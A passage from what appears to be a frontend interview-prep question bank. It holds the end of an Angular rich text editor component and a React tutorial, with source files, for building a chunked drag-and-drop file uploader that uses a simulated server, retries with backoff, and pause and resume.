  { cmd: "ul", label: "Bulleted list", text: "• List", key: "" },
  { cmd: "ol", label: "Numbered list", text: "1. List", key: "" },
];

@Component({
  selector: "app-rich-text-editor",
  standalone: true,
  template: \`
    <div class="rte">
      <div
        role="toolbar"
        aria-label="Formatting"
        aria-controls="rte-body"
        class="rte-tools"
      >
        @for (t of tools; track t.cmd) {
          <!-- preventDefault on mousedown keeps the editor selection -->
          <button
            type="button"
            [attr.aria-label]="t.label"
            [attr.aria-pressed]="pressed(t.cmd)"
            [attr.data-cmd]="t.cmd"
            [title]="
              t.key ? t.label + ' (Ctrl+' + t.key.toUpperCase() + ')' : t.label
            "
            (mousedown)="$event.preventDefault()"
            (click)="exec(t.cmd)"
          >
            <span [class]="'t-' + t.cmd">{{ t.text }}</span>
          </button>
        }
      </div>
      <!-- No template children: Angular never renders inside the editable element. -->
      <div
        #body
        id="rte-body"
        class="rte-body"
        contenteditable="true"
        role="textbox"
        aria-multiline="true"
        aria-label="Release notes"
        data-testid="editor"
        (input)="refresh()"
        (keydown)="onKeyDown($event)"
        (keyup)="refresh()"
        (mouseup)="refresh()"
        (paste)="onPaste($event)"
      ></div>
    </div>
  \`,
})
export class RichTextEditorComponent implements AfterViewInit, OnDestroy {
  @Output() htmlChange = new EventEmitter<string>();
  @ViewChild("body") body!: ElementRef<HTMLDivElement>;
  readonly tools = TOOLS;
  active = signal<Active>({ b: false, i: false, u: false, block: "p" });

  private onSel = () => {
    if (
      this.body.nativeElement.contains(
        document.getSelection()?.anchorNode ?? null,
      )
    )
      this.refresh();
  };

  ngAfterViewInit() {
    this.body.nativeElement.innerHTML = render(INITIAL);
    document.addEventListener("selectionchange", this.onSel);
    // zoneless: the parent signal write schedules one more render
    this.refresh();
  }
  ngOnDestroy() {
    document.removeEventListener("selectionchange", this.onSel);
  }

  refresh() {
    const root = this.body.nativeElement;
    const blocks = parse(root);
    this.active.set(activeState(blocks, readSelection(root)));
    this.htmlChange.emit(render(blocks));
  }
  exec(cmd: string) {
    if (runCommand(this.body.nativeElement, cmd)) this.refresh();
  }
  onKeyDown(e: KeyboardEvent) {
    const tool = TOOLS.find((t) => t.key && t.key === e.key.toLowerCase());
    if (tool && (e.ctrlKey || e.metaKey) && !e.altKey) {
      e.preventDefault();
      this.exec(tool.cmd);
    }
  }
  onPaste(e: ClipboardEvent) {
    e.preventDefault();
    pastePlain(
      this.body.nativeElement,
      e.clipboardData?.getData("text/plain") || "",
    );
    this.refresh();
  }
  pressed(cmd: string) {
    const a = this.active();
    return cmd === "ul" || cmd === "ol"
      ? a.block === cmd
      : a[cmd as "b" | "i" | "u"];
  }
}
`,
        },
      },
    },
  },
  // ══════════════════════════════════════════════════════════════════════════
  {
    title: "Build a Drag-and-drop file uploader with configurable chunk size",
    seoDescription: "Build a drag-and-drop chunked file uploader in React, Vue and Angular: Blob.slice chunks, concurrency, progress, pause and resume, retries with backoff.",
    description: `**Question presented to candidate:**
"Build a file uploader. Users drag files onto a drop zone or pick them with a button. Each file is uploaded in chunks, with a chunk size the user can choose. Show progress per file, let the user pause and resume, and retry chunks that fail. There is no real backend, so simulate the upload endpoint."

**Requirements:**
- A drop zone that highlights while files are dragged over it, plus a "Browse files" button for keyboard and mouse users.
- A chunk size selector (1 KB to 5 MB); each file is split with \`Blob.slice\` into byte ranges.
- A simulated endpoint with latency and occasional failures, plus an "offline" switch.
- Per-file progress (chunks done, percentage, a \`progressbar\`), with Pause, Resume and Retry buttons.
- Up to 2 chunks in flight per file; failed chunks retry with exponential backoff, and a file fails after a few attempts.
- When all chunks arrive, the server reassembles the file and the client checks that it matches.

**What a strong answer should cover:**
- \`dragenter\`, \`dragover\`, \`dragleave\` and \`drop\` handling: \`preventDefault\` on \`dragover\` (or \`drop\` never fires), and a depth counter so child elements do not flicker the highlight.
- A framework-free upload controller: a chunk plan, a concurrency-limited pump, retry with backoff, and \`AbortController\` for pause.
- Keeping controller objects out of render state, and rendering immutable snapshots.
- Resumability: only chunks not yet acknowledged are re-sent.
- Edge cases: a 0-byte file, the last short chunk, and cleanup on unmount.

**Clarifying questions expected:**
- "Does the real server support chunked or resumable uploads (for example S3 multipart or tus), and does it have a minimum part size?"
- "How many files and chunks may upload at once?"
- "Should pause survive a page reload?"

**Code / implementation expected:** Yes. The chunking and retry logic, the simulated server and the drop zone UI.`,
    frameworks: {
      react: {
        answer: `**Target Audience:** React developers preparing for a machine coding round who know hooks and promises but have not built an upload pipeline.
**Difficulty:** Hard

> **How to read this doc:** Every idea is explained in plain words first, then tagged with a <code>📌 Interview term:</code> callout giving the vocabulary an interviewer expects. Anything marked "Verified" was printed by the real code: React 19 in StrictMode in jsdom against the simulated server, with real timers, and the same component in headless Chromium 141 with a real \`DragEvent\` and a real file chooser.

## 1. Why This Even Matters — A Story First

Moving house with one enormous box is a bad plan. If you drop it on the stairs, everything breaks, and you start again from the van. Movers use many small boxes instead. Two people carry boxes at the same time, a box that slips gets picked up again, and if it starts raining you pause, then carry on with the boxes still in the van. At the new house someone checks the inventory against the list.

A chunked uploader is the same plan for bytes:

- \`Blob.slice\` makes the boxes.
- A small **pump** keeps two in flight.
- A failed chunk is retried after a growing wait.
- Pause aborts what is in the air, and resume sends only what has not arrived.
- A checksum at the end is the inventory check.

The drag-and-drop zone on top has a few traps of its own, and they are covered too.

## 2. Questions to Ask Your Interviewer First

| Question | Why it matters |
| :--- | :--- |
| Does the server accept chunks, and with what rules? | Real protocols set limits. For example, [AWS documents](https://docs.aws.amazon.com/AmazonS3/latest/userguide/qfacts.html) S3 multipart parts as 5 MiB to 5 GiB, with no minimum for the last part and at most 10,000 parts. |
| How many uploads at once? | Sets the concurrency per file and across files. |
| Which errors are retryable? | A 503 or a network drop should retry. A 413 (too large) or a 403 should not. |
| Must pause survive a reload? | If yes, the server must report which chunks it has, and the client must persist upload ids. |
| Do we verify integrity? | A checksum per chunk or per file catches corruption and missing parts. |
| File type or size limits? | Validate before starting rather than after 400 chunks. |

## 3. Requirements and Plan

- A drop zone with a highlight while dragging, plus a Browse button backed by a hidden \`<input type="file" multiple>\`.
- A chunk size selector, and a "Simulate offline" switch.
- Per file: chunks done out of total, retries so far, a \`progressbar\`, a status, and Pause, Resume or Retry.
- Concurrency 2 per file, 3 retries with 100, 200 and 400 ms backoff, and a checksum check at the end.

| Piece | Where it lives | Why |
| :--- | :--- | :--- |
| \`chunkPlan\`, \`checksum\`, \`createUpload\` | \`uploader.js\`, no React | Testable with Node timers and Blobs alone. |
| Simulated server | \`createFakeServer()\` in a \`useRef\`, created once | 120 ms per request, every 4th chunk fails its first try, an offline switch. |
| Upload controllers | \`useRef(new Map())\` | Objects with methods; they are not something to render. |
| What the list shows | \`useState([])\` of **snapshots** | Plain immutable objects emitted by the controller. |

📌 **Interview term: Snapshot** — a plain, frozen-in-time copy of an object's state (\`{ id, name, size, total, done, bytes, status, message, retried }\`). The controller calls \`onUpdate(snapshot)\` after every change, and React stores it in state. The UI never reaches into the controller's live internals, so a render can never see half-updated data.

<svg class="iq-diagram" width="100%" viewBox="0 0 720 220" role="img" aria-label="Upload pipeline: a File is sliced into chunks, a pump keeps two chunk requests in flight against the server, failures go to a retry with backoff and back into the pump, and when every chunk is acknowledged the server reassembles the file and the checksums are compared">
  <defs>
    <marker id="up6r-arrow" markerWidth="8" markerHeight="8" refX="5" refY="3" orient="auto">
      <path class="d-arrow" d="M0,0 L7,3 L0,6 Z"/>
    </marker>
  </defs>
  <rect class="d-box-muted" x="10" y="30" width="130" height="60" rx="10"/>
  <text class="d-text" x="75" y="55" text-anchor="middle">File</text>
  <text class="d-sub" x="75" y="75" text-anchor="middle">Blob.slice</text>
  <rect class="d-box-accent" x="200" y="30" width="140" height="60" rx="10"/>
  <text class="d-text d-accent" x="270" y="55" text-anchor="middle">pump</text>
  <text class="d-sub" x="270" y="75" text-anchor="middle">2 in flight</text>
  <rect class="d-box" x="400" y="30" width="130" height="60" rx="10"/>
  <text class="d-text" x="465" y="55" text-anchor="middle">server</text>
  <text class="d-sub" x="465" y="75" text-anchor="middle">simulated</text>
  <rect class="d-box" x="590" y="30" width="120" height="60" rx="10"/>
  <text class="d-text" x="650" y="55" text-anchor="middle">complete</text>
  <text class="d-sub" x="650" y="75" text-anchor="middle">checksum</text>
  <rect class="d-box-muted" x="330" y="145" width="140" height="60" rx="10"/>
  <text class="d-text" x="400" y="170" text-anchor="middle">retry</text>
  <text class="d-sub" x="400" y="190" text-anchor="middle">100, 200, 400 ms</text>
  <path class="d-edge-accent" d="M 140 60 L 196 60" marker-end="url(#up6r-arrow)"/>
  <path class="d-edge-accent" d="M 340 60 L 396 60" marker-end="url(#up6r-arrow)"/>
  <path class="d-edge-accent" d="M 530 60 L 586 60" marker-end="url(#up6r-arrow)"/>
  <path class="d-edge" d="M 465 90 L 445 141" marker-end="url(#up6r-arrow)"/>
  <path class="d-edge" d="M 350 145 L 290 94" marker-end="url(#up6r-arrow)"/>
</svg>

Every chunk the server acknowledges is recorded in a \`done\` set. Pause, resume and retry all come down to "send whatever is not in \`done\`".

## 4. Build It Step by Step

### 4.1 The chunk plan

\`\`\`js
export function chunkPlan(size, chunkSize) {
  // a 0-byte file still gets one empty chunk
  const total = Math.max(1, Math.ceil(size / chunkSize));
  return Array.from({ length: total }, (_, i) => ({
    index: i,
    start: i * chunkSize,
    end: Math.min(size, (i + 1) * chunkSize),
  }));
}
\`\`\`

A 10,499-byte file with 1 KB chunks gives 11 chunks, and the last one is 259 bytes. \`file.slice(start, end)\` returns a new \`Blob\` view of those bytes **without reading the file into memory**. The bytes are read only when the request body is sent.

📌 **Interview term: \`Blob.slice\`** — returns a \`Blob\` for a byte range of a \`File\` or \`Blob\`, lazily. It is how a 2 GB video can be uploaded without a 2 GB \`ArrayBuffer\` ([chunking an array](/interview-question/array-chunking) is the same arithmetic on elements).

### 4.2 A simulated endpoint you can reason about

\`\`\`js
uploadChunk({ uploadId, index, blob, signal }) {
  return new Promise((resolve, reject) => {
    if (signal?.aborted) return reject(abortError());
    const t = setTimeout(() => {
      const key = uploadId + ":" + index;
      tries.set(key, (tries.get(key) || 0) + 1);
      if (offline) return reject(new Error("Network error"));
      if (index % 4 === 3 && tries.get(key) === 1)
        return reject(new Error("503 Service Unavailable"));
      // stored by index: order of arrival does not matter
      uploads.get(uploadId).set(index, blob);
      resolve({ index, received: blob.size });
    }, latency);
    const onAbort = () => {
      clearTimeout(t);
      reject(abortError());
    };
    signal?.addEventListener("abort", onAbort, { once: true });
  });
}
\`\`\`

The failures are deterministic on purpose: every 4th chunk fails exactly once. Random failures would make the demo and the verified output different on every run. \`complete(uploadId, total)\` builds \`new Blob(parts in index order)\`, and returns its size and an FNV-1a checksum. The client computes the same checksum over the original file and compares.

📌 **Interview term: \`AbortSignal\`** — the cancellation token from an \`AbortController\`. \`fetch(url, { signal })\` rejects with an \`AbortError\` when \`controller.abort()\` is called, and the fake server honours the same contract ([aborting fetch](/interview-question/how-do-you-abort-a-fetch-api-request-using-abortcontroller)). In a real app, \`uploadChunk\` would be a \`fetch\` with \`PUT\` and a \`Content-Range\` header, or a part upload to a presigned URL.

### 4.3 Retry with exponential backoff

\`\`\`js
async function send(chunk) {
  const ctrl = new AbortController();
  inflight.set(chunk.index, ctrl);
  try {
    for (let attempt = 1; ; attempt++) {
      try {
        await server.uploadChunk({
          uploadId: id,
          index: chunk.index,
          blob: file.slice(chunk.start, chunk.end),
          signal: ctrl.signal,
        });
        done.add(chunk.index);
        return;
      } catch (e) {
        // paused: re-sent on resume
        if (e.name === "AbortError" || status !== "uploading") return;
        if (attempt > retries) {
          failed = chunk.index;
          message = \`Chunk \${chunk.index + 1} failed after \${attempt} attempts: \${e.message}\`;
          return;
        }
        retried++;
        emit();
        await sleep(backoff * 2 ** (attempt - 1)); // 100, 200, 400 ms
        if (status !== "uploading") return; // paused during the wait
      }
    }
  } finally {
    inflight.delete(chunk.index);
  }
}
\`\`\`

📌 **Interview term: Exponential backoff** — wait longer after each failure (here doubling), so a struggling server gets breathing room instead of a storm of retries. Production code adds random **jitter**, so a thousand clients that failed together do not retry together ([promise retry with backoff](/interview-question/implement-promiseretry-fn-retries-delay-with-exponential-backoff)).

### 4.4 The pump: concurrency without a library

\`\`\`js
function pump() {
  if (status !== "uploading") return;
  if (failed !== null) {
    status = "error";
    for (const c of inflight.values()) c.abort();
    emit();
    return;
  }
  if (done.size === plan.length) {
    finish();
    return;
  }
  for (const chunk of plan) {
    if (inflight.size >= concurrency) break;
    if (done.has(chunk.index) || inflight.has(chunk.index)) continue;
    send(chunk).then(() => {
      emit();
      pump();
    });
  }
}
\`\`\`

Every finished \`send\` calls \`pump\` again, which tops the in-flight count back up to 2. That one function covers all five cases:

- **Start** sends the first two chunks.
- **Resume** sends the next missing chunks.
- **Retry after an error** clears \`failed\` and pumps again.
- **Finish** happens when \`done\` is full.
- **Error** happens when a chunk has used up its attempts.

📌 **Interview term: Concurrency limit** — at most N tasks running, and a new one starts each time one ends. It is the same idea as [p-limit](/interview-question/implement-p-limit-concurrency-limiter-for-async-tasks), written inline because the queue is just "the next chunk not done or in flight".

Pause sets \`status = "paused"\` and aborts every in-flight controller. Chunks already in \`done\` stay done, so resume re-sends only what never got acknowledged.

### 4.5 The React layer

\`\`\`jsx
const server = useRef(null);
if (!server.current)
  server.current = createFakeServer({ latency: 120 });
const controllers = useRef(new Map());
const [uploads, setUploads] = useState([]);
const dragDepth = useRef(0);

useEffect(
  () => () => controllers.current.forEach((c) => c.cancel()),
  [],
); // abort on unmount

function addFiles(list) {
  for (const file of Array.from(list || [])) {
    const ctrl = createUpload(file, chunkSize, server.current, (snap) =>
      setUploads((all) =>
        all.some((u) => u.id === snap.id)
          ? all.map((u) => (u.id === snap.id ? snap : u))
          : [...all, snap],
      ),
    );
    controllers.current.set(ctrl.id, ctrl);
  }
}
\`\`\`

The \`setUploads\` updater is pure: it only replaces or appends a snapshot. That makes it safe when StrictMode calls updaters twice in development. The side effect, creating the upload, happens once in the event handler.

The drop zone handlers:

\`\`\`jsx
const prevent = (e) => {
  e.preventDefault();
  e.stopPropagation();
};
const onDragEnter = (e) => {
  prevent(e);
  dragDepth.current++;
  setDragging(true);
};
const onDragLeave = (e) => {
  prevent(e);
  if (--dragDepth.current <= 0) {
    dragDepth.current = 0;
    setDragging(false);
  }
};
const onDragOver = (e) => {
  prevent(e);
  if (e.dataTransfer) e.dataTransfer.dropEffect = "copy";
};
const onDrop = (e) => {
  prevent(e);
  dragDepth.current = 0;
  setDragging(false);
  addFiles(e.dataTransfer?.files);
};
\`\`\`

📌 **Interview term: Drop target** — an element becomes a valid drop target only if \`dragover\` is cancelled with \`preventDefault()\`. Without it, \`drop\` never fires and the browser opens the file in the tab instead.

📌 **Interview term: Drag depth counter** — moving the pointer from the zone onto its own \`<p>\` or \`<button>\` fires \`dragenter\` on the child and then \`dragleave\` on the zone. A plain boolean would switch the highlight off while the user is still over the zone. Counting enters minus leaves fixes the flicker.

The Browse button calls \`inputRef.current.click()\` on a hidden file input, and clears \`e.target.value\` after reading \`files\`, so picking the same file twice still fires \`change\`. Each row renders a \`role="progressbar"\` with \`aria-valuenow\`, and an \`aria-live="polite"\` status.

## 5. Verified

**In jsdom** (React 19 StrictMode). jsdom has \`File\`, \`Blob.slice\` and \`Blob.arrayBuffer\`, but no \`DragEvent\` or \`DataTransfer\`. So the driver dispatched plain events carrying a fake \`dataTransfer = { files, dropEffect }\`, and set the file input's \`files\` property itself. Uploads ran against the simulated server with real timers. Vue and Angular (AOT and JIT) printed identical lines:

\`\`\`text
dragenter x2, dragleave x1 -> zone class: up-zone over | Release to upload
dragover defaultPrevented: true | dropEffect: copy
drop notes.txt (1 KB chunks) -> 10.3 KB · chunk 0/11 | 0% | uploading | buttons: Pause | zone class: up-zone
first retry (~240 ms) -> 10.3 KB · chunk 3/11 · 1 retried | 29% | uploading | buttons: Pause
paused -> 10.3 KB · chunk 3/11 · 1 retried | 29% | paused | buttons: Resume || 500 ms later: 10.3 KB · chunk 3/11 · 1 retried | 29% | paused | buttons: Resume
resumed, finished in under 2 s -> 10.3 KB · chunk 11/11 · 2 retried | 100% | done: Verified: 10.3 KB, checksum 4470522a | buttons: none
picker photo.bin (4 KB chunks, offline) -> 8.8 KB · chunk 0/3 | 0% | uploading | buttons: Pause
offline -> 8.8 KB · chunk 0/3 · 6 retried | 0% | error: Chunk 1 failed after 4 attempts: Network error | buttons: Retry
online + Retry -> 8.8 KB · chunk 3/3 · 6 retried | 100% | done: Verified: 8.8 KB, checksum 63afb8cd | buttons: none
0-byte file -> 0 B · chunk 1/1 | 100% | done: Verified: 0 B, checksum 811c9dc5 | buttons: none
\`\`\`

Reading it:

- Two enters and one leave kept the highlight, and the cancelled \`dragover\` set \`dropEffect\` to \`copy\`.
- The first retry (chunk 4's 503) arrived with 3 of 11 chunks done.
- Pause held for 500 ms with no progress. Resume finished with a second retry (chunk 8) and a matching checksum.
- Offline, the two in-flight chunks each retried 3 times (6 retries), then the file failed with a clear message. Going online and pressing Retry completed it.
- A 0-byte file uploaded as one empty chunk.

About timing: the snapshot is taken when the first retry appears, at about 240 ms, not after a fixed delay. The first version slept 300 ms and printed \`chunk 3/11\` on some runs and \`chunk 4/11\` on others, because the next chunk lands at about 360 ms and timer jitter in a busy process moved the read. The finish time is only checked to be under 2 seconds.

**In headless Chromium 141** (playwright-core). The script built a real \`DataTransfer\` holding a \`File\` and dispatched real \`dragenter\`, \`dragover\` and \`drop\` \`DragEvent\`s on the zone. It then used Playwright's file chooser on the Browse button:

\`\`\`text
[chromium:react] DragEvent prevented enter/over/drop: true/true/true | class while over: "up-zone over" | drag.txt: done: Verified: 4.9 KB, checksum 616035e5 | picked.txt: done: Verified: 2.9 KB, checksum 02f9fe2d | console errors: none
\`\`\`

All three events were \`defaultPrevented\`, the highlight class was on the zone between \`dragover\` and \`drop\`, both files arrived intact, and there were no console errors. The first version of this script read the class synchronously, right after dispatching, and saw no highlight, because React had not rendered yet. Waiting 50 ms before reading fixed the check, not the component. Visual styling and screen reader announcements were not checked, and a real network was never involved.

## 6. Edge Cases and Accessibility

| Concern | Handling |
| :--- | :--- |
| 0-byte file | One empty chunk, so \`complete\` still runs |
| Last chunk shorter | \`end\` clamped to \`size\` |
| Chunk arrives out of order | Server stores by index and reassembles in order |
| Pause during a backoff wait | \`send\` checks \`status\` after the sleep |
| Same file picked twice | Input \`value\` cleared after \`change\` |
| Unmount mid-upload | Effect cleanup cancels every controller |
| Keyboard users | A real Browse button, not only the drop zone |
| Progress | \`role="progressbar"\` with \`aria-valuenow\`, and an \`aria-live\` status |

## 7. Common Pitfalls

- **Forgetting \`preventDefault\` on \`dragover\`.** \`drop\` never fires, and the browser navigates to the file.
- **A boolean highlight.** It flickers off over child elements; use a depth counter.
- **Reading the whole file into memory first** (\`file.arrayBuffer()\` then slicing). Use \`Blob.slice\` and let the request read the bytes.
- **Storing controllers in state, or mutating snapshots.** Keep controllers in a ref and replace snapshots immutably.
- **Retrying non-retryable errors.** A 413 will fail every time. Retry network errors and 5xx only.
- **Restarting from chunk 0 on resume.** Track acknowledged chunks and send only the rest.

## 8. How to Answer in an Interview

<div style="background:#1c140a;border:2px solid #f9a825;border-radius:10px;padding:20px 24px;margin:20px 0;">

<div style="color:#ffca28;font-size:1.15em;font-weight:bold;margin-bottom:16px;">🎤 How to Answer in an Interview</div>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:0 0 10px 0;">The 60-Second Answer</div>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">1. Plan:</strong> <span style="color:#f0e2c8;">"<code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">Blob.slice</code> byte ranges from <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">chunkPlan</code>, with one empty chunk for a 0-byte file and the last chunk clamped to the size."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">2. Controller:</strong> <span style="color:#f0e2c8;">"A framework-free <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">createUpload</code> with <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">done</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">inflight</code> sets, a pump holding 2 requests in flight, and snapshots sent to the UI."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">3. Failure:</strong> <span style="color:#f0e2c8;">"Retry with exponential backoff (100, 200, 400 ms), give up after 4 attempts, and a Retry button that resumes from the missing chunks."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">4. Pause:</strong> <span style="color:#f0e2c8;">"Abort the in-flight <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">AbortController</code>s; resume sends only what was not acknowledged; a checksum verifies the result."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">5. React layer:</strong> <span style="color:#f0e2c8;">"Controllers in a ref, snapshots in state, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">preventDefault</code> on <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">dragover</code>, a drag depth counter, a Browse button and a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">progressbar</code>."</span>
</blockquote>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:22px 0 10px 0;border-top:1px solid #4a3a1a;padding-top:16px;">Follow-Up Questions to Expect</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:12px 0 0 0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How do you make it resumable after a reload?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Persist the upload id and file fingerprint (name, size, lastModified) in <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">localStorage</code>, ask the server which parts it has, and send the rest. The user must pick the file again, because a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">File</code> cannot be restored.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you show smooth progress inside a big chunk?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;"><code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">fetch</code> has no upload progress events, so use <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">XMLHttpRequest</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">xhr.upload.onprogress</code> per chunk, adding loaded bytes to the acknowledged total.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How do you choose the chunk size?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Large enough to keep per-request overhead small, and small enough that a retry is cheap. Respect the server's limits, such as S3's 5 MiB minimum part size, except for the last part.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you upload many files at once?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Add a global limit across files, for example a shared queue the pumps draw from, so 50 files do not open 100 connections.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you test it?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Unit-test the controller in Node with a fake server and fake timers: failures on known chunks, pause during backoff, offline then retry. Then add one component test with a synthetic drop.</span>
</div>

</div>

## 9. Quick Glossary

| Term | Plain meaning |
| :--- | :--- |
| **Snapshot** | A plain copy of the upload state for rendering |
| **\`Blob.slice\`** | A lazy byte-range view of a file |
| **\`AbortSignal\`** | The token that cancels a request |
| **Exponential backoff** | Waiting longer after each failure |
| **Concurrency limit** | At most N requests at once |
| **Drop target** | An element whose \`dragover\` is cancelled |
| **Drag depth counter** | Enters minus leaves, so children do not flicker the highlight |

Related builds: [a data-fetching hook with retry](/interview-question/build-a-data-fetching-hook-with-caching-deduplication-and-retry) and [a file explorer with drag and drop](/interview-question/build-a-file-explorer-with-nested-drag-and-drop).

---
**Conclusion:** A chunked uploader is a plan of byte ranges, a pump that keeps a fixed number of requests in flight, retries with backoff, pause by aborting, resume by re-sending what is missing, and a checksum to prove the file arrived intact. React holds only snapshots and drag state, while the controller and the simulated server stay plain JavaScript. The verified run shows deterministic retries, a pause that really holds, offline failure followed by recovery, and an empty file. Chromium confirmed that real drag events and the file chooser deliver files the same way.`,
        files: {
          "/App.js": `import FileUploader from "./src/FileUploader";

const css = \`
  body { margin: 0; background: #0f1115; color: #e6e6e6; font-family: system-ui, sans-serif; }
  .page { max-width: 600px; margin: 0 auto; padding: 20px 16px; }
  .up-opts { display: flex; flex-wrap: wrap; gap: 16px; align-items: center; font-size: 14px; margin-bottom: 10px; color: #c9d1d9; }
  select { background: #171a21; color: #e6e6e6; border: 1px solid #2c3340; border-radius: 6px; padding: 4px 6px; }
  .up-zone { border: 2px dashed #3a4250; border-radius: 12px; padding: 28px 16px; text-align: center; background: #13161c; transition: background .15s, border-color .15s; }
  .up-zone.over { border-color: #f9a825; background: #1c140a; }
  .up-zone p { margin: 0 0 10px; color: #9aa4b2; }
  button { background: #222834; color: #e6e6e6; border: 1px solid #2c3340; border-radius: 8px; padding: 5px 12px; cursor: pointer; font: inherit; font-size: 13px; }
  .up-list { list-style: none; padding: 0; margin: 16px 0 0; display: flex; flex-direction: column; gap: 10px; }
  .up-list li { background: #171a21; border: 1px solid #2c3340; border-radius: 10px; padding: 10px 12px; }
  .up-row { display: flex; justify-content: space-between; gap: 8px; align-items: center; flex-wrap: wrap; font-size: 14px; }
  .up-meta, .up-status { color: #9aa4b2; font-size: 12px; word-break: break-word; }
  .up-bar { height: 6px; background: #262c36; border-radius: 3px; margin: 8px 0; overflow: hidden; }
  .up-fill { height: 100%; background: #f9a825; transition: width .2s; }
  .up-fill.done { background: #66bb6a; } .up-fill.error { background: #ef5350; } .up-fill.paused { background: #8b949e; }
\`;

export default function App() {
  return (
    <main className="page">
      <style>{css}</style>
      <h1 style={{ fontSize: 18 }}>Upload files</h1>
      <FileUploader />
    </main>
  );
}
`,
          "/src/FileUploader.js": `import { useEffect, useRef, useState } from "react";
import {
  CHUNK_SIZES,
  createFakeServer,
  createUpload,
  fmtBytes,
} from "./uploader";

export default function FileUploader() {
  const server = useRef(null);
  // simulated endpoint
  if (!server.current) server.current = createFakeServer({ latency: 120 });
  // upload id -> controller (not render state)
  const controllers = useRef(new Map());
  const inputRef = useRef(null);
  // snapshots, in the order files were added
  const [uploads, setUploads] = useState([]);
  const [chunkSize, setChunkSize] = useState(1024);
  const [offline, setOffline] = useState(false);
  const [dragging, setDragging] = useState(false);
  const dragDepth = useRef(0); // dragenter/dragleave also fire for children

  // abort on unmount
  useEffect(() => () => controllers.current.forEach((c) => c.cancel()), []);

  function addFiles(list) {
    for (const file of Array.from(list || [])) {
      const ctrl = createUpload(file, chunkSize, server.current, (snap) =>
        setUploads((all) =>
          all.some((u) => u.id === snap.id)
            ? all.map((u) => (u.id === snap.id ? snap : u))
            : [...all, snap],
        ),
      );
      controllers.current.set(ctrl.id, ctrl);
    }
  }
  const prevent = (e) => {
    e.preventDefault();
    e.stopPropagation();
  };
  const onDragEnter = (e) => {
    prevent(e);
    dragDepth.current++;
    setDragging(true);
  };
  const onDragLeave = (e) => {
    prevent(e);
    if (--dragDepth.current <= 0) {
      dragDepth.current = 0;
      setDragging(false);
    }
  };
  const onDragOver = (e) => {
    prevent(e);
    if (e.dataTransfer) e.dataTransfer.dropEffect = "copy";
  }; // required, or drop never fires
  const onDrop = (e) => {
    prevent(e);
    dragDepth.current = 0;
    setDragging(false);
    addFiles(e.dataTransfer?.files);
  };

  return (
    <div className="up">
      <div className="up-opts">
        <label>
          Chunk size{" "}
          <select
            data-testid="chunk"
            value={chunkSize}
            onChange={(e) => setChunkSize(Number(e.target.value))}
          >
            {CHUNK_SIZES.map((c) => (
              <option key={c.value} value={c.value}>
                {c.label}
              </option>
            ))}
          </select>
